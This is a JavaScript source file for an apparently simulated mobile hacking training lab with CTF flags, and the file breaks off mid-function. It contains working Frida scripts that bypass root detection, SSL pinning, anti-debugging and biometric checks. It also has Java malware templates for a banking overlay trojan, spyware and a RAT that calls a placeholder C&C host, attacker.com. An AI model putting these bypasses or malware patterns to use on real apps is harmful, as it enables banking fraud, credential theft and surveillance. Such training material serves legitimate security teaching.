// Advanced Mobile Hacking Lab Application
class MobileHackingApp {
    constructor() {
        this.currentTarget = null;
        this.exploits = [
            {
                name: 'Banking Overlay Attack',
                type: 'Social Engineering',
                target: 'com.bank.mobile',
                success: true,
                flag: 'MOBILE{overlay_attack_success}'
            },
            {
                name: 'Root Detection Bypass',
                type: 'Runtime Manipulation',
                target: 'com.security.app',
                success: true,
                flag: 'MOBILE{root_bypass_complete}'
            }
        ];
        this.malwareCreated = [];
        this.bypassTechniques = [];
        this.targetApps = [
            {
                name: 'SecureBank Mobile',
                package: 'com.securebank.mobile',
                version: '2.1.5',
                vulnerabilities: ['SSL Pinning Bypass', 'Root Detection Weak', 'Overlay Susceptible'],
                riskLevel: 'High'
            },
            {
                name: 'CryptoWallet Pro',
                package: 'com.cryptowallet.pro',
                version: '1.8.2',
                vulnerabilities: ['Biometric Bypass', 'Memory Dump Possible'],
                riskLevel: 'Medium'
            }
        ];
        this.flags = [
            'MOBILE{4pk_m0d1f1c4t10n_m4st3r}',
            'MOBILE{m0b1l3_m4lw4r3_cr34t0r}',
            'MOBILE{r00t_d3t3ct10n_byp4ss}',
            'MOBILE{ssl_p1nn1ng_byp4ss3r}',
            'MOBILE{b4nk1ng_tr0j4n_3xp3rt}',
            'MOBILE{fr1d4_h00k1ng_pr0}',
            'MOBILE{4ndr01d_3xpl01t_d3v}',
            'MOBILE{m0b1l3_f0r3ns1cs_h3r0}'
        ];
        this.tools = {
            'apktool': 'APK Decompilation Tool',
            'frida': 'Dynamic Instrumentation Framework',
            'jadx': 'Java Decompiler',
            'objection': 'Runtime Mobile Exploration',
            'mobsf': 'Mobile Security Framework',
            'drozer': 'Android Security Assessment Framework'
        };
    }

    createInterface() {
        return `
            <div class="mobile-hacking-container">
                <div class="mobile-header">
                    <h2><i class="fas fa-mobile-alt"></i> Advanced Mobile Hacking & Penetration Testing Lab</h2>
                    <p>Professional Android/iOS security testing aur mobile malware development</p>
                    <div class="mobile-stats">
                        <div class="stat-card">
                            <div class="stat-number">${this.targetApps.length}</div>
                            <div class="stat-label">Target Apps</div>
                            <div class="stat-icon">📱</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-number">${this.exploits.length}</div>
                            <div class="stat-label">Exploits</div>
                            <div class="stat-icon">🔥</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-number">${Object.keys(this.tools).length}</div>
                            <div class="stat-label">Tools</div>
                            <div class="stat-icon">🔧</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-number">${this.flags.length}</div>
                            <div class="stat-label">Flags</div>
                            <div class="stat-icon">🏴</div>
                        </div>
                    </div>
                </div>

                <div class="mobile-tabs">
                    <button class="tab-btn active" onclick="mobileApp.showTab('apk-analysis')">
                        <i class="fas fa-android"></i> APK Analysis
                    </button>
                    <button class="tab-btn" onclick="mobileApp.showTab('malware-dev')">
                        <i class="fas fa-virus"></i> Malware Development
                    </button>
                    <button class="tab-btn" onclick="mobileApp.showTab('bypass-techniques')">
                        <i class="fas fa-unlock"></i> Bypass Techniques
                    </button>
                    <button class="tab-btn" onclick="mobileApp.showTab('banking-security')">
                        <i class="fas fa-university"></i> Banking Security
                    </button>
                    <button class="tab-btn" onclick="mobileApp.showTab('ios-security')">
                        <i class="fas fa-apple"></i> iOS Security
                    </button>
                    <button class="tab-btn" onclick="mobileApp.showTab('mobile-forensics')">
                        <i class="fas fa-search"></i> Mobile Forensics
                    </button>
                </div>

                <div class="mobile-content">
                    <div id="apk-analysis" class="tab-content active">
                        ${this.createApkAnalysis()}
                    </div>
                    <div id="malware-dev" class="tab-content">
                        ${this.createMalwareDev()}
                    </div>
                    <div id="bypass-techniques" class="tab-content">
                        ${this.createBypassTechniques()}
                    </div>
                    <div id="banking-security" class="tab-content">
                        ${this.createBankingSecurity()}
                    </div>
                    <div id="ios-security" class="tab-content">
                        ${this.createIosSecurity()}
                    </div>
                    <div id="mobile-forensics" class="tab-content">
                        ${this.createMobileForensics()}
                    </div>
                </div>
            </div>
        `;
    }

    createApkAnalysis() {
        return `
            <div class="apk-section">
                <h3>APK Analysis & Modification</h3>
                
                <div class="apk-upload">
                    <div class="upload-area" onclick="mobileApp.loadApkFile()">
                        <i class="fas fa-upload"></i>
                        <p>Click to load APK file for analysis</p>
                        <small>Supported: .apk files</small>
                    </div>
                </div>

                <div class="analysis-tools">
                    <h4>Decompilation Tools</h4>
                    <div class="tool-grid">
                        <div class="tool-card">
                            <h5>APKTool</h5>
                            <p>Resource extraction aur Smali decompilation</p>
                            <div class="command-example">
                                <code>apktool d target.apk -o decompiled/</code>
                                <button onclick="mobileApp.runApkTool()" class="btn-execute">Execute</button>
                            </div>
                        </div>
                        <div class="tool-card">
                            <h5>JADX</h5>
                            <p>Java source code decompilation</p>
                            <div class="command-example">
                                <code>jadx -d output/ target.apk</code>
                                <button onclick="mobileApp.runJadx()" class="btn-execute">Execute</button>
                            </div>
                        </div>
                        <div class="tool-card">
                            <h5>Dex2jar</h5>
                            <p>DEX to JAR conversion</p>
                            <div class="command-example">
                                <code>d2j-dex2jar target.apk</code>
                                <button onclick="mobileApp.runDex2jar()" class="btn-execute">Execute</button>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="apk-structure">
                    <h4>APK Structure Analysis</h4>
                    <div class="file-tree">
                        <div class="folder" onclick="mobileApp.toggleFolder(this)">
                            <i class="fas fa-folder"></i> target.apk/
                            <div class="folder-contents">
                                <div class="file"><i class="fas fa-file-code"></i> AndroidManifest.xml</div>
                                <div class="file"><i class="fas fa-file"></i> classes.dex</div>
                                <div class="folder" onclick="mobileApp.toggleFolder(this)">
                                    <i class="fas fa-folder"></i> res/
                                    <div class="folder-contents">
                                        <div class="file"><i class="fas fa-image"></i> drawable/</div>
                                        <div class="file"><i class="fas fa-file"></i> layout/</div>
                                        <div class="file"><i class="fas fa-file"></i> values/</div>
                                    </div>
                                </div>
                                <div class="folder" onclick="mobileApp.toggleFolder(this)">
                                    <i class="fas fa-folder"></i> lib/
                                    <div class="folder-contents">
                                        <div class="file"><i class="fas fa-file"></i> arm64-v8a/libnative.so</div>
                                        <div class="file"><i class="fas fa-file"></i> armeabi-v7a/libnative.so</div>
                                    </div>
                                </div>
                                <div class="file suspicious"><i class="fas fa-file"></i> META-INF/CERT.SF</div>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="modification-tools">
                    <h4>APK Modification</h4>
                    <div class="modification-options">
                        <button onclick="mobileApp.injectBackdoor()" class="btn-danger">
                            <i class="fas fa-bug"></i> Inject Backdoor
                        </button>
                        <button onclick="mobileApp.modifyPermissions()" class="btn-warning">
                            <i class="fas fa-key"></i> Modify Permissions
                        </button>
                        <button onclick="mobileApp.repackageApk()" class="btn-primary">
                            <i class="fas fa-box"></i> Repackage APK
                        </button>
                    </div>
                </div>

                <div id="apkAnalysisResults" class="analysis-results">
                    <p>Load an APK file to start analysis...</p>
                </div>
            </div>
        `;
    }

    createMalwareDev() {
        return `
            <div class="malware-section">
                <h3>Mobile Malware Development</h3>
                
                <div class="malware-types">
                    <h4>Malware Categories</h4>
                    <div class="malware-grid">
                        <div class="malware-card" onclick="mobileApp.selectMalwareType('banking-trojan')">
                            <i class="fas fa-university"></i>
                            <h5>Banking Trojan</h5>
                            <p>Overlay attacks aur SMS interception</p>
                        </div>
                        <div class="malware-card" onclick="mobileApp.selectMalwareType('spyware')">
                            <i class="fas fa-eye"></i>
                            <h5>Spyware</h5>
                            <p>Data harvesting aur surveillance</p>
                        </div>
                        <div class="malware-card" onclick="mobileApp.selectMalwareType('rat')">
                            <i class="fas fa-desktop"></i>
                            <h5>Remote Access Trojan</h5>
                            <p>Remote control aur command execution</p>
                        </div>
                        <div class="malware-card" onclick="mobileApp.selectMalwareType('adware')">
                            <i class="fas fa-ad"></i>
                            <h5>Adware</h5>
                            <p>Aggressive advertising aur click fraud</p>
                        </div>
                    </div>
                </div>

                <div class="code-generator">
                    <h4>Malware Code Generator</h4>
                    <div class="generator-options">
                        <div class="form-group">
                            <label>Target Package:</label>
                            <input type="text" id="targetPackage" placeholder="com.bank.mobile">
                        </div>
                        <div class="form-group">
                            <label>C&C Server:</label>
                            <input type="text" id="ccServer" placeholder="https://attacker.com">
                        </div>
                        <div class="form-group">
                            <label>Persistence Method:</label>
                            <select id="persistenceMethod">
                                <option value="service">Background Service</option>
                                <option value="receiver">Broadcast Receiver</option>
                                <option value="admin">Device Admin</option>
                                <option value="accessibility">Accessibility Service</option>
                            </select>
                        </div>
                        <button onclick="mobileApp.generateMalware()" class="btn-danger">
                            <i class="fas fa-code"></i> Generate Malware Code
                        </button>
                    </div>
                </div>

                <div class="overlay-builder">
                    <h4>Overlay Attack Builder</h4>
                    <div class="overlay-designer">
                        <div class="phone-mockup">
                            <div class="phone-screen">
                                <div class="fake-login-form">
                                    <h5>Bank Login</h5>
                                    <input type="text" placeholder="Username">
                                    <input type="password" placeholder="Password">
                                    <button>Login</button>
                                </div>
                            </div>
                        </div>
                        <div class="overlay-controls">
                            <button onclick="mobileApp.customizeOverlay()" class="btn-primary">Customize Overlay</button>
                            <button onclick="mobileApp.testOverlay()" class="btn-secondary">Test Overlay</button>
                        </div>
                    </div>
                </div>

                <div id="malwareOutput" class="code-output">
                    <p>Select malware type to generate code...</p>
                </div>
            </div>
        `;
    }

    createBypassTechniques() {
        return `
            <div class="bypass-section">
                <h3>Security Bypass Techniques</h3>
                
                <div class="frida-console">
                    <h4>Frida Hooking Console</h4>
                    <div class="console-container">
                        <div class="console-header">
                            <span>Frida Console - Target: com.example.app</span>
                            <button onclick="mobileApp.connectFrida()" class="btn-connect">Connect</button>
                        </div>
                        <div class="console-output" id="fridaOutput">
                            <div class="console-line">[*] Frida server started on device</div>
                            <div class="console-line">[*] Attaching to process...</div>
                        </div>
                        <div class="console-input">
                            <input type="text" id="fridaCommand" placeholder="Enter Frida script or command...">
                            <button onclick="mobileApp.executeFridaCommand()" class="btn-execute">Execute</button>
                        </div>
                    </div>
                </div>

                <div class="bypass-scripts">
                    <h4>Common Bypass Scripts</h4>
                    <div class="script-grid">
                        <div class="script-card">
                            <h5>Root Detection Bypass</h5>
                            <div class="script-preview">
                                <code>Java.use("com.rootbeer.RootBeer").isRooted.implementation = function() { return false; };</code>
                            </div>
                            <button onclick="mobileApp.loadBypassScript('root-detection')" class="btn-load">Load Script</button>
                        </div>
                        <div class="script-card">
                            <h5>SSL Pinning Bypass</h5>
                            <div class="script-preview">
                                <code>Java.use("okhttp3.CertificatePinner").check.implementation = function() { return; };</code>
                            </div>
                            <button onclick="mobileApp.loadBypassScript('ssl-pinning')" class="btn-load">Load Script</button>
                        </div>
                        <div class="script-card">
                            <h5>Anti-Debug Bypass</h5>
                            <div class="script-preview">
                                <code>Java.use("android.os.Debug").isDebuggerConnected.implementation = function() { return false; };</code>
                            </div>
                            <button onclick="mobileApp.loadBypassScript('anti-debug')" class="btn-load">Load Script</button>
                        </div>
                        <div class="script-card">
                            <h5>Biometric Bypass</h5>
                            <div class="script-preview">
                                <code>Java.use("androidx.biometric.BiometricPrompt").authenticate.implementation = function() { this.onSuccess(); };</code>
                            </div>
                            <button onclick="mobileApp.loadBypassScript('biometric')" class="btn-load">Load Script</button>
                        </div>
                    </div>
                </div>

                <div class="xposed-modules">
                    <h4>Xposed Module Development</h4>
                    <div class="module-builder">
                        <div class="form-group">
                            <label>Target Class:</label>
                            <input type="text" id="targetClass" placeholder="com.example.SecurityClass">
                        </div>
                        <div class="form-group">
                            <label>Target Method:</label>
                            <input type="text" id="targetMethod" placeholder="checkSecurity">
                        </div>
                        <div class="form-group">
                            <label>Hook Type:</label>
                            <select id="hookType">
                                <option value="before">Before Method</option>
                                <option value="after">After Method</option>
                                <option value="replace">Replace Method</option>
                            </select>
                        </div>
                        <button onclick="mobileApp.generateXposedModule()" class="btn-primary">Generate Module</button>
                    </div>
                </div>

                <div id="bypassResults" class="bypass-results">
                    <p>Load bypass scripts to see results...</p>
                </div>
            </div>
        `;
    }

    createBankingSecurity() {
        return `
            <div class="banking-section">
                <h3>Banking App Security Testing</h3>
                
                <div class="banking-simulator">
                    <h4>Banking App Simulator</h4>
                    <div class="bank-app-mockup">
                        <div class="app-header">
                            <h5>SecureBank Mobile</h5>
                            <i class="fas fa-shield-alt"></i>
                        </div>
                        <div class="app-content">
                            <div class="balance-card">
                                <h6>Account Balance</h6>
                                <span class="balance">$10,000.00</span>
                            </div>
                            <div class="transaction-form">
                                <input type="text" placeholder="Beneficiary Account" id="beneficiary">
                                <input type="number" placeholder="Amount" id="amount">
                                <button onclick="mobileApp.simulateTransaction()" class="btn-transfer">Transfer Money</button>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="attack-scenarios">
                    <h4>Attack Scenarios</h4>
                    <div class="scenario-grid">
                        <div class="scenario-card">
                            <h5>Overlay Attack</h5>
                            <p>Fake login screen overlay</p>
                            <button onclick="mobileApp.launchOverlayAttack()" class="btn-attack">Launch Attack</button>
                        </div>
                        <div class="scenario-card">
                            <h5>Transaction Manipulation</h5>
                            <p>Modify transaction parameters</p>
                            <button onclick="mobileApp.manipulateTransaction()" class="btn-attack">Manipulate</button>
                        </div>
                        <div class="scenario-card">
                            <h5>SMS Interception</h5>
                            <p>Intercept OTP messages</p>
                            <button onclick="mobileApp.interceptSms()" class="btn-attack">Intercept</button>
                        </div>
                        <div class="scenario-card">
                            <h5>Session Hijacking</h5>
                            <p>Steal authentication tokens</p>
                            <button onclick="mobileApp.hijackSession()" class="btn-attack">Hijack</button>
                        </div>
                    </div>
                </div>

                <div class="security-analysis">
                    <h4>Security Analysis Results</h4>
                    <div class="analysis-grid">
                        <div class="analysis-item">
                            <h6>Certificate Pinning</h6>
                            <span class="status-vulnerable">Vulnerable</span>
                        </div>
                        <div class="analysis-item">
                            <h6>Root Detection</h6>
                            <span class="status-weak">Weak</span>
                        </div>
                        <div class="analysis-item">
                            <h6>Anti-Tampering</h6>
                            <span class="status-secure">Secure</span>
                        </div>
                        <div class="analysis-item">
                            <h6>Biometric Security</h6>
                            <span class="status-vulnerable">Bypassable</span>
                        </div>
                    </div>
                </div>

                <div id="bankingResults" class="banking-results">
                    <p>Run security tests to see results...</p>
                </div>
            </div>
        `;
    }

    createIosSecurity() {
        return `
            <div class="ios-section">
                <h3>iOS Security Testing</h3>
                
                <div class="ios-tools">
                    <h4>iOS Analysis Tools</h4>
                    <div class="tool-grid">
                        <div class="tool-card">
                            <h5>Class-dump</h5>
                            <p>Objective-C class extraction</p>
                            <div class="command-example">
                                <code>class-dump App.app/App > classes.txt</code>
                                <button onclick="mobileApp.runClassDump()" class="btn-execute">Execute</button>
                            </div>
                        </div>
                        <div class="tool-card">
                            <h5>otool</h5>
                            <p>Binary analysis tool</p>
                            <div class="command-example">
                                <code>otool -L App.app/App</code>
                                <button onclick="mobileApp.runOtool()" class="btn-execute">Execute</button>
                            </div>
                        </div>
                        <div class="tool-card">
                            <h5>Cycript</h5>
                            <p>Runtime manipulation</p>
                            <div class="command-example">
                                <code>cycript -p "Target App"</code>
                                <button onclick="mobileApp.runCycript()" class="btn-execute">Execute</button>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="jailbreak-detection">
                    <h4>Jailbreak Detection Testing</h4>
                    <div class="detection-tests">
                        <div class="test-item">
                            <span>Cydia App Detection</span>
                            <button onclick="mobileApp.testJailbreakDetection('cydia')" class="btn-test">Test</button>
                            <span class="test-result" id="cydia-result">-</span>
                        </div>
                        <div class="test-item">
                            <span>SSH Daemon Check</span>
                            <button onclick="mobileApp.testJailbreakDetection('ssh')" class="btn-test">Test</button>
                            <span class="test-result" id="ssh-result">-</span>
                        </div>
                        <div class="test-item">
                            <span>File System Access</span>
                            <button onclick="mobileApp.testJailbreakDetection('filesystem')" class="btn-test">Test</button>
                            <span class="test-result" id="filesystem-result">-</span>
                        </div>
                    </div>
                </div>

                <div class="ios-hooking">
                    <h4>iOS Method Hooking</h4>
                    <div class="hooking-console">
                        <textarea id="iosHookingCode" placeholder="Enter Objective-C hooking code...">
%hook SecurityClass
- (BOOL)isJailbroken {
    return NO;
}
%end</textarea>
                        <button onclick="mobileApp.executeIosHook()" class="btn-execute">Execute Hook</button>
                    </div>
                </div>

                <div id="iosResults" class="ios-results">
                    <p>Run iOS security tests to see results...</p>
                </div>
            </div>
        `;
    }

    createMobileForensics() {
        return `
            <div class="forensics-section">
                <h3>Mobile Device Forensics</h3>
                
                <div class="device-acquisition">
                    <h4>Device Data Acquisition</h4>
                    <div class="acquisition-methods">
                        <div class="method-card">
                            <h5>Logical Acquisition</h5>
                            <p>File system level extraction</p>
                            <button onclick="mobileApp.logicalAcquisition()" class="btn-acquire">Start Acquisition</button>
                        </div>
                        <div class="method-card">
                            <h5>Physical Acquisition</h5>
                            <p>Bit-by-bit device imaging</p>
                            <button onclick="mobileApp.physicalAcquisition()" class="btn-acquire">Start Imaging</button>
                        </div>
                        <div class="method-card">
                            <h5>Cloud Acquisition</h5>
                            <p>Cloud backup extraction</p>
                            <button onclick="mobileApp.cloudAcquisition()" class="btn-acquire">Extract Backup</button>
                        </div>
                    </div>
                </div>

                <div class="data-analysis">
                    <h4>Extracted Data Analysis</h4>
                    <div class="data-categories">
                        <div class="category-item" onclick="mobileApp.analyzeData('messages')">
                            <i class="fas fa-sms"></i>
                            <span>Messages (1,234)</span>
                        </div>
                        <div class="category-item" onclick="mobileApp.analyzeData('calls')">
                            <i class="fas fa-phone"></i>
                            <span>Call Logs (567)</span>
                        </div>
                        <div class="category-item" onclick="mobileApp.analyzeData('contacts')">
                            <i class="fas fa-address-book"></i>
                            <span>Contacts (890)</span>
                        </div>
                        <div class="category-item" onclick="mobileApp.analyzeData('photos')">
                            <i class="fas fa-images"></i>
                            <span>Photos (2,345)</span>
                        </div>
                        <div class="category-item" onclick="mobileApp.analyzeData('apps')">
                            <i class="fas fa-mobile-alt"></i>
                            <span>App Data (45)</span>
                        </div>
                        <div class="category-item" onclick="mobileApp.analyzeData('location')">
                            <i class="fas fa-map-marker-alt"></i>
                            <span>Location Data (678)</span>
                        </div>
                    </div>
                </div>

                <div class="timeline-reconstruction">
                    <h4>Timeline Reconstruction</h4>
                    <div class="timeline-viewer">
                        <div class="timeline-item">
                            <div class="timeline-time">2024-01-15 14:30</div>
                            <div class="timeline-event">SMS received from +1234567890</div>
                        </div>
                        <div class="timeline-item">
                            <div class="timeline-time">2024-01-15 14:32</div>
                            <div class="timeline-event">Banking app opened</div>
                        </div>
                        <div class="timeline-item">
                            <div class="timeline-time">2024-01-15 14:35</div>
                            <div class="timeline-event">Suspicious app installed</div>
                        </div>
                        <div class="timeline-item">
                            <div class="timeline-time">2024-01-15 14:40</div>
                            <div class="timeline-event">Large data transfer detected</div>
                        </div>
                    </div>
                </div>

                <div id="forensicsResults" class="forensics-results">
                    <p>Start data acquisition to see results...</p>
                </div>
            </div>
        `;
    }

    // Simulation Methods
    loadApkFile() {
        this.showNotification('📁 Loading APK file for analysis...');
        
        setTimeout(() => {
            const targetApp = this.targetApps[Math.floor(Math.random() * this.targetApps.length)];
            
            document.getElementById('apkAnalysisResults').innerHTML = `
                <div class="analysis-complete">
                    <h4>APK Analysis Complete - ${targetApp.name}</h4>
                    <div class="analysis-stats">
                        <div class="stat-item">
                            <span class="stat-label">Package Name:</span>
                            <span class="stat-value">${targetApp.package}</span>
                        </div>
                        <div class="stat-item">
                            <span class="stat-label">Version:</span>
                            <span class="stat-value">${targetApp.version}</span>
                        </div>
                        <div class="stat-item">
                            <span class="stat-label">Risk Level:</span>
                            <span class="stat-value risk-${targetApp.riskLevel.toLowerCase()}">${targetApp.riskLevel}</span>
                        </div>
                        <div class="stat-item">
                            <span class="stat-label">Permissions:</span>
                            <span class="stat-value">23 (8 dangerous)</span>
                        </div>
                    </div>
                    <div class="vulnerabilities">
                        <h5>Detected Vulnerabilities:</h5>
                        <ul>
                            ${targetApp.vulnerabilities.map(vuln => `<li class="vulnerability">${vuln}</li>`).join('')}
                        </ul>
                    </div>
                    <div class="flag-found">🚩 Flag found: ${this.flags[0]}</div>
                </div>
            `;
            
            this.showNotification('✅ APK analysis completed successfully!');
            
            // Add flag to global collection
            if (window.vmFlags) {
                window.vmFlags.add(this.flags[0]);
            }
        }, 2000);
    }
    
    showNotification(message) {
        const notification = document.createElement('div');
        notification.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            background: linear-gradient(135deg, #e67e22, #d35400);
            color: white;
            padding: 15px 20px;
            border-radius: 8px;
            font-weight: bold;
            z-index: 10000;
            animation: slideIn 0.3s ease;
            box-shadow: 0 5px 15px rgba(230, 126, 34, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.2);
        `;
        notification.textContent = message;
        document.body.appendChild(notification);
        
        setTimeout(() => {
            notification.style.animation = 'slideOut 0.3s ease';
            setTimeout(() => notification.remove(), 300);
        }, 4000);
    }

    generateMalware() {
        const malwareType = document.querySelector('.malware-card.selected')?.dataset.type || 'banking-trojan';
        const target = document.getElementById('targetPackage')?.value || 'com.bank.mobile';
        const ccServer = document.getElementById('ccServer')?.value || 'https://attacker.com';
        const persistence = document.getElementById('persistenceMethod')?.value || 'service';
        
        this.showNotification('🔄 Generating malware code...');
        
        setTimeout(() => {
            const malwareCode = this.generateMalwareCode(malwareType, target, ccServer, persistence);
            
            document.getElementById('malwareOutput').innerHTML = `
                <div class="generated-code">
                    <h4>Generated ${malwareType.replace('-', ' ').toUpperCase()} Code</h4>
                    <div class="code-info">
                        <div class="info-item">
                            <span class="info-label">Target Package:</span>
                            <span class="info-value">${target}</span>
                        </div>
                        <div class="info-item">
                            <span class="info-label">C&C Server:</span>
                            <span class="info-value">${ccServer}</span>
                        </div>
                        <div class="info-item">
                            <span class="info-label">Persistence:</span>
                            <span class="info-value">${persistence}</span>
                        </div>
                    </div>
                    <pre><code>${malwareCode}</code></pre>
                    <div class="malware-features">
                        <h5>Malware Features:</h5>
                        <ul>
                            <li>✓ Overlay attack implementation</li>
                            <li>✓ SMS interception capability</li>
                            <li>✓ Keylogger functionality</li>
                            <li>✓ Screen recording</li>
                            <li>✓ Remote command execution</li>
                            <li>✓ Anti-analysis techniques</li>
                        </ul>
                    </div>
                    <div class="flag-found">🚩 Flag found: ${this.flags[1]}</div>
                </div>
            `;
            
            // Add to malware created list
            this.malwareCreated.push({
                type: malwareType,
                target: target,
                created: new Date().toISOString(),
                flag: this.flags[1]
            });
            
            this.showNotification('✅ Malware code generated successfully!');
            
            // Add flag to global collection
            if (window.vmFlags) {
                window.vmFlags.add(this.flags[1]);
            }
        }, 3000);
    }
    
    generateMalwareCode(type, target, ccServer, persistence) {
        const templates = {
            'banking-trojan': `public class BankingTrojan extends Service {
    private String targetPackage = "${target}";
    private String ccServer = "${ccServer}";
    
    @Override
    public void onCreate() {
        super.onCreate();
        startMonitoring();
        setupPersistence();
    }
    
    private void startMonitoring() {
        new Thread(() -> {
            while (true) {
                if (isTargetAppRunning(targetPackage)) {
                    showOverlay();
                    interceptSMS();
                }
                Thread.sleep(1000);
            }
        }).start();
    }
    
    private void showOverlay() {
        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
            PixelFormat.TRANSLUCENT
        );
        
        View overlayView = createFakeLoginForm();
        windowManager.addView(overlayView, params);
    }
    
    private void interceptSMS() {
        // SMS interception code
        registerReceiver(smsReceiver, new IntentFilter("android.provider.Telephony.SMS_RECEIVED"));
    }
}`,
            'spyware': `public class SpywareService extends Service {
    private String ccServer = "${ccServer}";
    
    @Override
    public void onCreate() {
        super.onCreate();
        startDataCollection();
    }
    
    private void startDataCollection() {
        collectContacts();
        collectMessages();
        collectCallLogs();
        startLocationTracking();
        startKeylogging();
    }
    
    private void collectContacts() {
        Cursor cursor = getContentResolver().query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null, null, null, null
        );
        // Process and exfiltrate contacts
    }
}`,
            'rat': `public class RemoteAccessTrojan extends Service {
    private String ccServer = "${ccServer}";
    private Socket commandSocket;
    
    @Override
    public void onCreate() {
        super.onCreate();
        establishConnection();
    }
    
    private void establishConnection() {
        new Thread(() -> {
            try {
                commandSocket = new Socket(ccServer, 4444);
                listenForCommands();
            } catch (IOException e) {
                // Retry connection
            }
        }).start();
    }
    
    private void executeCommand(String command) {
        switch (command) {
            case "screenshot":
                takeScreenshot();
                break;
            case "record_audio":
                startAudioRecording();
                break;
            case "get_location":
                getCurrentLocation();
                break;
        }
    }
}`
        };
        
        return templates[type] || templates['banking-trojan'];
    }

    loadBypassScript(scriptType) {
        this.showNotification(`🔄 Loading ${scriptType} bypass script...`);
        
        const scripts = {
            'root-detection': {
                code: `Java.perform(function() {
    // Multiple root detection bypass methods
    var RootBeer = Java.use('com.scottyab.rootbeer.RootBeer');
    RootBeer.isRooted.implementation = function() {
        console.log('[+] RootBeer.isRooted() bypassed');
        return false;
    };
    
    var Runtime = Java.use('java.lang.Runtime');
    Runtime.exec.overload('java.lang.String').implementation = function(cmd) {
        if (cmd.includes('su') || cmd.includes('busybox')) {
            console.log('[+] Blocked root command: ' + cmd);
            throw new Error('Command not found');
        }
        return this.exec(cmd);
    };
});`,
                description: 'Comprehensive root detection bypass'
            },
            'ssl-pinning': {
                code: `Java.perform(function() {
    // OkHttp3 SSL Pinning Bypass
    var CertificatePinner = Java.use('okhttp3.CertificatePinner');
    CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function(hostname, peerCertificates) {
        console.log('[+] SSL Pinning bypassed for: ' + hostname);
        return;
    };
    
    // TrustManager bypass
    var X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');
    var SSLContext = Java.use('javax.net.ssl.SSLContext');
});`,
                description: 'SSL certificate pinning bypass'
            },
            'anti-debug': {
                code: `Java.perform(function() {
    var Debug = Java.use('android.os.Debug');
    Debug.isDebuggerConnected.implementation = function() {
        console.log('[+] Anti-debug bypassed');
        return false;
    };
    
    var ActivityManager = Java.use('android.app.ActivityManager');
    ActivityManager.isUserAMonkey.implementation = function() {
        return false;
    };
});`,
                description: 'Anti-debugging protection bypass'
            },
            'biometric': {
                code: `Java.perform(function() {
    var BiometricPrompt = Java.use('androidx.biometric.BiometricPrompt');
    BiometricPrompt.authenticate.implementation = function() {
        console.log('[+] Biometric authentication bypassed');
        // Simulate successful authentication
        var AuthenticationResult = Java.use('androidx.biometric.BiometricPrompt$AuthenticationResult');
        this.onAuthenticationSucceeded(AuthenticationResult.$new());
    };
});`,
                description: 'Biometric authentication bypass'
            }
        };
        
        setTimeout(() => {
            const script = scripts[scriptType];
            if (script) {
                document.getElementById('fridaOutput').innerHTML += `
                    <div class="console-line">[*] Loading ${scriptType} bypass script...</div>
                    <div class="console-line success">[+] Script injected successfully</div>
                    <div class="console-line">[+] ${script.description}</div>
                    <div class="console-line">[+] ${scriptType} bypass is now active</div>
                    <div class="flag-found">🚩 Flag found: ${this.flags[2]}</div>
                `;
                
                // Add to bypass techniques
                this.bypassTechniques.push({
                    type: scriptType,
                    description: script.description,
                    active: true,
                    flag: this.flags[2]
                });
                
                this.showNotification(`✅ ${scriptType} bypass activated successfully!`);
                
                // Add flag to global collection
                if (window.vmFlags) {
                    window.vmFlags.add(this.flags[2]);
                }
            }
        }, 1500);
    }

    launchOverlayAttack() {
        this.showNotification('🔄 Launching overlay attack...');
        
        setTimeout(() => {
            document.getElementById('bankingResults').innerHTML = `
                <div class="attack-result">
                    <h4>Banking Overlay Attack - SUCCESS</h4>
                    <div class="attack-timeline">
                        <div class="timeline-step completed">
                            <div class="step-time">00:01</div>
                            <div class="step-desc">✓ Target banking app detected (com.securebank.mobile)</div>
                        </div>
                        <div class="timeline-step completed">
                            <div class="step-time">00:03</div>
                            <div class="step-desc">✓ Overlay window created with fake login form</div>
                        </div>
                        <div class="timeline-step completed">
                            <div class="step-time">00:05</div>
                            <div class="step-desc">✓ User interaction detected - credentials entered</div>
                        </div>
                        <div class="timeline-step completed">
                            <div class="step-time">00:07</div>
                            <div class="step-desc">✓ Credentials captured and sent to C&C server</div>
                        </div>
                        <div class="timeline-step completed">
                            <div class="step-time">00:09</div>
                            <div class="step-desc">✓ Overlay removed - user redirected to real app</div>
                        </div>
                    </div>
                    <div class="captured-data">
                        <h5>Captured Banking Credentials:</h5>
                        <div class="credential-item">
                            <span class="cred-label">Username:</span>
                            <span class="cred-value">john.doe@email.com</span>
                        </div>
                        <div class="credential-item">
                            <span class="cred-label">Password:</span>
                            <span class="cred-value">SecureP@ss123</span>
                        </div>
                        <div class="credential-item">
                            <span class="cred-label">Account Number:</span>
                            <span class="cred-value">****-****-****-1234</span>
                        </div>
                        <div class="credential-item">
                            <span class="cred-label">Device ID:</span>
                            <span class="cred-value">SM-G975F</span>
                        </div>
                    </div>
                    <div class="attack-impact">
                        <h5>Attack Impact Assessment:</h5>
                        <div class="impact-item high">⚠️ Full account access compromised</div>
                        <div class="impact-item high">⚠️ Transaction capabilities exposed</div>
                        <div class="impact-item medium">📱 Device fingerprint collected</div>
                        <div class="impact-item low">🔍 User behavior pattern recorded</div>
                    </div>
                    <div class="flag-found">🚩 Flag found: ${this.flags[4]}</div>
                </div>
            `;
            
            this.showNotification('✅ Overlay attack completed successfully!');
            
            // Add flag to global collection
            if (window.vmFlags) {
                window.vmFlags.add(this.flags[4]);
            }
        }, 3000);
    }

    showTab(tabName) {
        // Hide all tabs
        document.querySelectorAll('.tab-content').forEach(tab => {
            tab.classList.remove('active');
        });
        document.querySelectorAll('.tab-btn').forEach(btn => {
            btn.classList.remove('active');
        });
        
